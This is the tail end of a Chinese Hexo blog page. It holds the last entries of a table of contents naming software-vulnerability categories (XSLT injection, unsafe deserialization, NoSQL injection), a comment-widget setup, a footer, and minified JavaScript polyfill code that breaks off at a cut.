class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSLT-Injection"><span class="toc-number">1.6.99.</span> <span class="toc-text">XSLT Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-350"><span class="toc-number">1.6.99.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-350"><span class="toc-number">1.6.99.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-349"><span class="toc-number">1.6.99.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-348"><span class="toc-number">1.6.99.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-BeanUtils-Deserialization"><span class="toc-number">1.6.100.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe BeanUtils Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-351"><span class="toc-number">1.6.100.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-351"><span class="toc-number">1.6.100.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-350"><span class="toc-number">1.6.100.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-349"><span class="toc-number">1.6.100.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization"><span class="toc-number">1.6.101.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe YAML Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-352"><span class="toc-number">1.6.101.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-352"><span class="toc-number">1.6.101.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-351"><span class="toc-number">1.6.101.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-350"><span class="toc-number">1.6.101.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fragment-Injection"><span class="toc-number">1.6.102.</span> <span class="toc-text">Fragment Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-353"><span class="toc-number">1.6.102.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-353"><span class="toc-number">1.6.102.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-352"><span class="toc-number">1.6.102.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-351"><span class="toc-number">1.6.102.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Cross-Site-Scripting-Protection"><span class="toc-number">1.6.103.</span> <span class="toc-text">HTML5: Cross-Site Scripting Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-354"><span class="toc-number">1.6.103.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-354"><span class="toc-number">1.6.103.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-353"><span class="toc-number">1.6.103.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-352"><span class="toc-number">1.6.103.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-Form-Field-Validation"><span class="toc-number">1.6.104.</span> <span class="toc-text">Missing Form Field Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-355"><span class="toc-number">1.6.104.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-355"><span class="toc-number">1.6.104.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-354"><span class="toc-number">1.6.104.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-353"><span class="toc-number">1.6.104.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQL-Injection-DynamoDB"><span class="toc-number">1.6.105.</span> <span class="toc-text">NoSQL Injection: DynamoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-356"><span class="toc-number">1.6.105.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-356"><span class="toc-number">1.6.105.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-354"><span class="toc-number">1.6.105.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQL-Injection-MongoDB"><span class="toc-number">1.6.106.</span> <span class="toc-text">NoSQL Injection: MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-357"><span class="toc-number">1.6.106.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-357"><span class="toc-number">1.6.106.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-355"><span class="toc-number">1.6.106.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-Misconfiguration-HTML-Escaping-Disabled"><span class="toc-number">1.6.107.</span> <span class="toc-text">Spring Misconfiguration: HTML Escaping Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-358"><span class="toc-number">1.6.107.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-358"><span class="toc-number">1.6.107.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-355"><span class="toc-number">1.6.107.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-356"><span class="toc-number">1.6.107.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li></ol></li></ol>
                    </div>
                </span>
            </div>
        </div>
        
    </div>
</aside>



  
  
  

  

  
    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
      <div id="vcomment" class="comment"></div> 
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
   var notify = 'false' == true ? true : false;
   var verify = 'false' == true ? true : false;
    window.onload = function() {
        new Valine({
            el: '#vcomment',
            notify: notify,
            verify: verify,
            app_id: "cPIja8hEdmK0DO1mNhmKUtdb-gzGzoHsz",
            app_key: "rAG7JWw8FX9LqnHJj0NTvGdW",
            placeholder: "兄弟姐妹们，别默默地路过，吐槽下嘛～～～",
            avatar:"hide"
        });
    }
</script>

    </section>
  

  

  


          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2020 QingYu
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
  

        <!-- 不蒜子统计   
        <span id="busuanzi_container_site_pv" style='display:none'>
                本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </span>
        <span class="post-meta-divider">|</span> 
        -->
        <span id="busuanzi_container_site_uv" >
                您是本博客第<span id="busuanzi_value_site_uv"></span>个访客，qingyu欢迎您的到来~
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


</footer>
    </div>
    <script>
	var yiliaConfig = {
		mathjax: false,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		toc_hide_index: true,
		root: "/",
		innerArchive: true,
		showTags: false
	}
</script>

<script>!function(t){function n(e){if(r[e])return r[e].exports;var i=r[e]={exports:{},id:e,loaded:!1};return t[e].call(i.exports,i,i.exports,n),i.loaded=!0,i.exports}var r={};n.m=t,n.c=r,n.p="./",n(0)}([function(t,n,r){r(195),t.exports=r(191)},function(t,n,r){var e=r(3),i=r(52),o=r(27),u=r(28),c=r(53),f="prototype",a=function(t,n,r){var s,l,h,v,p=t&a.F,d=t&a.G,y=t&a.S,g=t&a.P,b=t&a.B,m=d?e:y?e[n]||(e[n]={}):(e[n]||{})[f],x=d?i:i[n]||(i[n]={}),w=x[f]||(x[f]={});d&&(r=n);for(s in r)l=!p&&m&&void 0!==m[s],h=(l?m:r)[s],v=b&&l?c(h,e):g&&"function"==typeof h?c(Function.call,h):h,m&&u(m,s,h,t&a.U),x[s]!=h&&o(x,s,v),g&&w[s]!=h&&(w[s]=h)};e.core=i,a.F=1,a.G=2,a.S=4,a.P=8,a.B=16,a.W=32,a.U=64,a.R=128,t.exports=a},function(t,n,r){var e=r(6);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n,r){var e=r(126)("wks"),i=r(76),o=r(3).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){var e=r(94),i=r(33);t.exports=function(t){return e(i(t))}},function(t,n,r){t.exports=!r(4)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(2),i=r(167),o=r(50),u=Object.defineProperty;n.f=r(10)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){t.exports=!r(18)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(14),i=r(22);t.exports=r(12)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(20),i=r(58),o=r(42),u=Object.defineProperty;n.f=r(12)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){var e=r(40)("wks"),i=r(23),o=r(5).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n,r){var e=r(67),i=Math.min;t.exports=function(t){return t>0?i(e(t),9007199254740991):0}},function(t,n,r){var e=r(46);t.exports=function(t){return Object(e(t))}},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n,r){var e=r(63),i=r(34);t.exports=Object.keys||function(t){return e(t,i)}},function(t,n,r){var e=r(21);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var r=0,e=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++r+e).toString(36))}},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n){var r=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=r)},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n,r){var e=r(11),i=r(66);t.exports=r(10)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(3),i=r(27),o=r(24),u=r(76)("src"),c="toString",f=Function[c],a=(""+f).split(c);r(52).inspectSource=function(t){return f.call(t)},(t.exports=function(t,n,r,c){var f="function"==typeof r;f&&(o(r,"name")||i(r,"name",n)),t[n]!==r&&(f&&(o(r,u)||i(r,u,t[n]?""+t[n]:a.join(String(n)))),t===e?t[n]=r:c?t[n]?t[n]=r:i(t,n,r):(delete t[n],i(t,n,r)))})(Function.prototype,c,function(){return"function"==typeof this&&this[u]||f.call(this)})},function(t,n,r){var e=r(1),i=r(4),o=r(46),u=function(t,n,r,e){var i=String(o(t)),u="<"+n;return""!==r&&(u+=" "+r+'="'+String(e).replace(/"/g,"&quot;")+'"'),u+">"+i+"</"+n+">"};t.exports=function(t,n){var r={};r[t]=n(u),e(e.P+e.F*i(function(){var n=""[t]('"');return n!==n.toLowerCase()||n.split('"').length>3}),"String",r)}},function(t,n,r){var e=r(115),i=r(46);t.exports=function(t){return e(i(t))}},function(t,n,r){var e=r(116),i=r(66),o=r(30),u=r(50),c=r(24),f=r(167),a=Object.getOwnPropertyDescriptor;n.f=r(10)?a:function(t,n){if(t=o(t),n=u(n,!0),f)try{return a(t,n)}catch(t){}if(c(t,n))return i(!e.f.call(t,n),t[n])}},function(t,n,r){var e=r(24),i=r(17),o=r(145)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=i(t),e(t,o)?t[o]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){t.exports=!0},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,r){var e=r(14).f,i=r(8),o=r(15)("toStringTag");t.exports=function(t,n,r){t&&!i(t=r?t:t.prototype,o)&&e(t,o,{configurable:!0,value:n})}},function(t,n,r){var e=r(40)("keys"),i=r(23);t.exports=function(t){return e[t]||(e[t]=i(t))}},function(t,n,r){var e=r(5),i="__core-js_shared__",o=e[i]||(e[i]={});t.exports=function(t){return o[t]||(o[t]={})}},function(t,n){var r=Math.ceil,e=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(t>0?e:r)(t)}},function(t,n,r){var e=r(21);t.exports=function(t,n){if(!e(t))return t;var r,i;if(n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;if("function"==typeof(r=t.valueOf)&&!e(i=r.call(t)))return i;if(!n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(5),i=r(25),o=r(36),u=r(44),c=r(14).f;t.exports=function(t){var n=i.Symbol||(i.Symbol=o?{}:e.Symbol||{});"_"==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},function(t,n,r){n.f=r(15)},function(t,n){var r={}.toString;t.exports=function(t){return r.call(t).slice(8,-1)}},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n,r){var e=r(4);t.exports=function(t,n){return!!t&&e(function(){n?t.call(null,function(){},1):t.call(null)})}},function(t,n,r){var e=r(53),i=r(115),o=r(17),u=r(16),c=r(203);t.exports=function(t,n){var r=1==t,f=2==t,a=3==t,s=4==t,l=6==t,h=5==t||l,v=n||c;return function(n,c,p){for(var d,y,g=o(n),b=i(g),m=e(c,p,3),x=u(b.length),w=0,S=r?v(n,x):f?v(n,0):void 0;x>w;w++)if((h||w in b)&&(d=b[w],y=m(d,w,g),t))if(r)S[w]=y;else if(y)switch(t){case 3:return!0;case 5:return d;case 6:return w;case 2:S.push(d)}else if(s)return!1;return l?-1:a||s?s:S}}},function(t,n,r){var e=r(1),i=r(52),o=r(4);t.exports=function(t,n){var r=(i.Object||{})[t]||Object[t],u={};u[t]=n(r),e(e.S+e.F*o(function(){r(1)}),"Object",u)}},function(t,n,r){var e=r(6);t.exports=function(t,n){if(!e(t))return t;var r,i;if(n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;if("function"==typeof(r=t.valueOf)&&!e(i=r.call(t)))return i;if(!n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(5),i=r(25),o=r(91),u=r(13),c="prototype",f=function(t,n,r){var a,s,l,h=t&f.F,v=t&f.G,p=t&f.S,d=t&f.P,y=t&f.B,g=t&f.W,b=v?i:i[n]||(i[n]={}),m=b[c],x=v?e:p?e[n]:(e[n]||{})[c];v&&(r=n);for(a in r)(s=!h&&x&&void 0!==x[a])&&a in b||(l=s?x[a]:r[a],b[a]=v&&"function"!=typeof x[a]?r[a]:y&&s?o(l,e):g&&x[a]==l?function(t){var n=function(n,r,e){if(this instanceof t){switch(arguments.length){case 0:return new t;case 1:return new t(n);case 2:return new t(n,r)}return new t(n,r,e)}return t.apply(this,arguments)};return n[c]=t[c],n}(l):d&&"function"==typeof l?o(Function.call,l):l,d&&((b.virtual||(b.virtual={}))[a]=l,t&f.R&&m&&!m[a]&&u(m,a,l)))};f.F=1,f.G=2,f.S=4,f.P=8,f.B=16,f.W=32,f.U=64,f.R=128,t.exports=f},function(t,n){var r=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=r)},function(t,n,r){var e=r(26);t.exports=function(t,n,r){if(e(t),void 0===n)return t;switch(r){case 1:return function(r){return t.call(n,r)};case 2:return function(r,e){return t.call(n,r,e)};case 3:return function(r,e,i){return t.call(n,r,e,i)}}return function(){return t.apply(n,arguments)}}},function(t,n,r){var e=r(183),i=r(1),o=r(126)("metadata"),u=o.store||(o.store=new(r(186))),c=function(t,n,r){var i=u.get(t);if(!i){if(!r)return;u.set(t,i=new e)}var o=i.get(n);if(!o){if(!r)return;i.set(n,o=new e)}return o},f=function(t,n,r){var e=c(n,r,!1);return void 0!==e&&e.has(t)},a=function(t,n,r){var e=c(n,r,!1);return void 0===e?void 0:e.get(t)},s=function(t,n,r,e){c(r,e,!0).set(t,n)},l=function(t,n){var r=c(t,n,!1),e=[];return r&&r.forEach(function(t,n){e.push(n)}),e},h=function(t){return void 0===t||"symbol"==typeof t?t:String(t)},v=function(t){i(i.S,"Reflect",t)};t.exports={store:u,map:c,has:f,get:a,set:s,keys:l,key:h,exp:v}},function(t,n,r){"use strict";if(r(10)){var e=r(69),i=r(3),o=r(4),u=r(1),c=r(127),f=r(152),a=r(53),s=r(68),l=r(66),h=r(27),v=r(73),p=r(67),d=r(16),y=r(75),g=r(50),b=r(24),m=r(180),x=r(114),w=r(6),S=r(17),_=r(137),O=r(70),E=r(32),P=r(71).f,j=r(154),F=r(76),M=r(7),A=r(48),N=r(117),T=r(146),I=r(155),k=r(80),L=r(123),R=r(74),C=r(130),D=r(160),U=r(11),W=r(31),G=U.f,B=W.f,V=i.RangeError,z=i.TypeError,q=i.Uint8Array,K="ArrayBuffer",J="Shared"+K,Y="BYTES_PER_ELEMENT",H="prototype",$=Array[H],X=f.ArrayBuffer,Q=f.DataView,Z=A(0),tt=A(2),nt=A(3),rt=A(4),et=A(5),it=A(6),ot=N(!0),ut=N(!1),ct=I.values,ft=I.keys,at=I.entries,st=$.lastIndexOf,lt=$.reduce,ht=$.reduceRight,vt=$.join,pt=$.sort,dt=$.slice,yt=$.toString,gt=$.toLocaleString,bt=M("iterator"),mt=M("toStringTag"),xt=F("typed_constructor"),wt=F("def_constructor"),St=c.CONSTR,_t=c.TYPED,Ot=c.VIEW,Et="Wrong length!",Pt=A(1,function(t,n){return Tt(T(t,t[wt]),n)}),jt=o(function(){return 1===new q(new Uint16Array([1]).buffer)[0]}),Ft=!!q&&!!q[H].set&&o(function(){new q(1).set({})}),Mt=function(t,n){if(void 0===t)throw z(Et);var r=+t,e=d(t);if(n&&!m(r,e))throw V(Et);return e},At=function(t,n){var r=p(t);if(r<0||r%n)throw V("Wrong offset!");return r},Nt=function(t){if(w(t)&&_t in t)return t;throw z(t+" is not a typed array!")},Tt=function(t,n){if(!(w(t)&&xt in t))throw z("It is not a typed array constructor!");return new t(n)},It=function(t,n){return kt(T(t,t[wt]),n)},kt=function(t,n){for(var r=0,e=n.length,i=Tt(t,e);e>r;)i[r]=n[r++];return i},Lt=function(t,n,r){G(t,n,{get:function(){return this._d[r]}})},Rt=function(t){var n,r,e,i,o,u,c=S(t),f=arguments.length,s=f>1?arguments[1]:void 0,l=void 0!==s,h=j(c);if(void 0!=h&&!_(h)){for(u=h.call(c),e=[],n=0;!(o=u.next()).done;n++)e.push(o.value);c=e}for(l&&f>2&&(s=a(s,arguments[2],2)),n=0,r=d(c.length),i=Tt(this,r);r>n;n++)i[n]=l?s(c[n],n):c[n];return i},Ct=function(){for(var t=0,n=arguments.length,r=Tt(this,n);n>t;)r[t]=arguments[t++];return r},Dt=!!q&&o(function(){gt.call(new q(1))}),Ut=function(){return gt.apply(Dt?dt.call(Nt(this)):Nt(this),arguments)},Wt={copyWithin:function(t,n){return D.call(Nt(this),t,n,arguments.length>2?arguments[2]:void 0)},every:function(t){return rt(Nt(this),t,arguments.length>1?arguments[1]:void 0)},fill:function(t){return C.apply(Nt(this),arguments)},filter:function(t){return It(this,tt(Nt(this),t,arguments.length>1?arguments[1]:void 0))},find:function(t){return et(Nt(this),t,arguments.length>1?arguments[1]:void 0)},findIndex:function(t){return it(Nt(this),t,arguments.length>1?arguments[1]:void 0)},forEach:function(t){Z(Nt(this),t,arguments.length>1?arguments[1]:void 0)},indexOf:function(t){return ut(Nt(this),t,arguments.length>1?arguments[1]:void 0)},includes:function(t){return ot(Nt(this),t,arguments.length>1?arguments[1]:void 0)},join:function(t){return vt.apply(Nt(this),arguments)},lastIndexOf:function(t){return st.apply(Nt(this),arguments)},map:function(t){return Pt(Nt(this),t,arguments.length>1?arguments[1]:void 0)},reduce:function(t){return lt.apply(Nt(this),arguments)},reduceRight:function(t){return ht.apply(Nt(this),arguments)},reverse:function(){for(var t,n=this,r=Nt(n).length,e=Math.floor(r/2),i=0;i<e;)t=n[i],n[i++]=n[--r],n[r]=t;return n},some:function(t){return nt(Nt(this),t,arguments.length>1?arguments[1]:void 0)},sort:function(t){return pt.call(Nt(this),t)},subarray:function(t,n){var r=Nt(this),e=r.length,i=y(t,e);return new(T(r,r[wt]))(r.buffer,r.byteOffset+i*r.BYTES_PER_ELEMENT,d((void 0===n?e:y(n,e))-i))}},Gt=function(t,n){return It(this,dt.call(Nt(this),t,n))},Bt=function(t){Nt(this);var n=At(arguments[1],1),r=this.length,e=S(t),i=d(e.length),o=0;if(i+n>r)throw V(Et);for(;o<i;)this[n+o]=e[o++]},Vt={entries:function(){return at.call(Nt(this))},keys:function(){return ft.call(Nt(this))},values:function(){return ct.call(Nt(this))}},zt=function(t,n){return w(t)&&t[_t]&&"symbol"!=typeof n&&n in t&&String(+n)==String(n)},qt=function(t,n){return zt(t,n=g(n,!0))?l(2,t[n]):B(t,n)},Kt=function(t,n,r){return!(zt(t,n=g(n,!0))&&w(r)&&b(r,"value"))||b(r,"get")||b(r,"set")||r.configurable||b(r,"writable")&&!r.writable||b(r,"enumerable")&&!r.enumerable?G(t,n,r):(t[n]=r.value,t)};St||(W.f=qt,U.f=Kt),u(u.S+u.F*!St,"Object",{getOwnPropertyDescriptor:qt,defineProperty:Kt}),o(function(){yt.call({})})&&(yt=gt=function(){return vt.call(this)});var Jt=v({},Wt);v(Jt,Vt),h(Jt,bt,Vt.values),v(Jt,{slice:Gt,set:Bt,constructor:function(){},toString:yt,toLocaleString:Ut}),Lt(Jt,"buffer","b"),Lt(Jt,"byteOffset","o"),Lt(Jt,"byteLength","l"),Lt(Jt,"length","e"),G(Jt,mt,{get:function(){return this[_t]}}),t.exports=function(t,n,r,f){f=!!f;var a=t+(f?"Clamped":"")+"Array",l="Uint8Array"!=a,v="get"+t,p="set"+t,y=i[a],g=y||{},b=y&&E(y),m=!y||!c.ABV,S={},_=y&&y[H],j=function(t,r){var e=t._d;return e.v[v](r*n+e.o,jt)},F=function(t,r,e){var i=t._d;f&&(e=(e=Math.round(e))<0?0:e>255?255:255&e),i.v[p](r*n+i.o,e,jt)},M=function(t,n){G(t,n,{get:function(){return j(this,n)},set:function(t){return F(this,n,t)},enumerable:!0})};m?(y=r(function(t,r,e,i){s(t,y,a,"_d");var o,u,c,f,l=0,v=0;if(w(r)){if(!(r instanceof X||(f=x(r))==K||f==J))return _t in r?kt(y,r):Rt.call(y,r);o=r,v=At(e,n);var p=r.byteLength;if(void 0===i){if(p%n)throw V(Et);if((u=p-v)<0)throw V(Et)}else if((u=d(i)*n)+v>p)throw V(Et);c=u/n}else c=Mt(r,!0),u=c*n,o=new X(u);for(h(t,"_d",{b:o,o:v,l:u,e:c,v:new Q(o)});l<c;)M(t,l++)}),_=y[H]=O(Jt),h(_,"constructor",y)):L(function(t){new y(null),new y(t)},!0)||(y=r(function(t,r,e,i){s(t,y,a);var o;return w(r)?r instanceof X||(o=x(r))==K||o==J?void 0!==i?new g(r,At(e,n),i):void 0!==e?new g(r,At(e,n)):new g(r):_t in r?kt(y,r):Rt.call(y,r):new g(Mt(r,l))}),Z(b!==Function.prototype?P(g).concat(P(b)):P(g),function(t){t in y||h(y,t,g[t])}),y[H]=_,e||(_.constructor=y));var A=_[bt],N=!!A&&("values"==A.name||void 0==A.name),T=Vt.values;h(y,xt,!0),h(_,_t,a),h(_,Ot,!0),h(_,wt,y),(f?new y(1)[mt]==a:mt in _)||G(_,mt,{get:function(){return a}}),S[a]=y,u(u.G+u.W+u.F*(y!=g),S),u(u.S,a,{BYTES_PER_ELEMENT:n,from:Rt,of:Ct}),Y in _||h(_,Y,n),u(u.P,a,Wt),R(a),u(u.P+u.F*Ft,a,{set:Bt}),u(u.P+u.F*!N,a,Vt),u(u.P+u.F*(_.toString!=yt),a,{toString:yt}),u(u.P+u.F*o(function(){new y(1).slice()}),a,{slice:Gt}),u(u.P+u.F*(o(function(){return[1,2].toLocaleString()!=new y([1,2]).toLocaleString()})||!o(function(){_.toLocaleString.call([1,2])})),a,{toLocaleString:Ut}),k[a]=N?A:T,e||N||h(_,bt,T)}}else t.exports=function(){}},function(t,n){var r={}.toString;t.exports=function(t){return r.call(t).slice(8,-1)}},function(t,n,r){var e=r(21),i=r(5).document,o=e(i)&&e(i.createElement);t.exports=function(t){return o?i.createElement(t):{}}},function(t,n,r){t.exports=!r(12)&&!r(18)(function(){return 7!=Object.defineProperty(r(57)("div"),"a",{get:function(){return 7}}).a})},function(t,n,r){"use strict";var e=r(36),i=r(51),o=r(64),u=r(13),c=r(8),f=r(35),a=r(96),s=r(38),l=r(103),h=r(15)("iterator"),v=!([].keys&&"next"in[].keys()),p="keys",d="values",y=function(){return this};t.exports=function(t,n,r,g,b,m,x){a(r,n,g);var w,S,_,O=function(t){if(!v&&t in F)return F[t];switch(t){case p:case d:return function(){return new r(this,t)}}return function(){return new r(this,t)}},E=n+" Iterator",P=b==d,j=!1,F=t.prototype,M=F[h]||F["@@iterator"]||b&&F[b],A=M||O(b),N=b?P?O("entries"):A:void 0,T="Array"==n?F.entries||M:M;if(T&&(_=l(T.call(new t)))!==Object.prototype&&(s(_,E,!0),e||c(_,h)||u(_,h,y)),P&&M&&M.name!==d&&(j=!0,A=function(){return M.call(this)}),e&&!x||!v&&!j&&F[h]||u(F,h,A),f[n]=A,f[E]=y,b)if(w={values:P?A:O(d),keys:m?A:O(p),entries:N},x)for(S in w)S in F||o(F,S,w[S]);else i(i.P+i.F*(v||j),n,w);return w}},function(t,n,r){var e=r(20),i=r(100),o=r(34),u=r(39)("IE_PROTO"),c=function(){},f="prototype",a=function(){var t,n=r(57)("iframe"),e=o.length;for(n.style.display="none",r(93).appendChild(n),n.src="javascript:",t=n.contentWindow.document,t.open(),t.write("<script>document.F=Object<\/script>"),t.close(),a=t.F;e--;)delete a[f][o[e]];return a()};t.exports=Object.create||function(t,n){var r;return null!==t?(c[f]=e(t),r=new c,c[f]=null,r[u]=t):r=a(),void 0===n?r:i(r,n)}},function(t,n,r){var 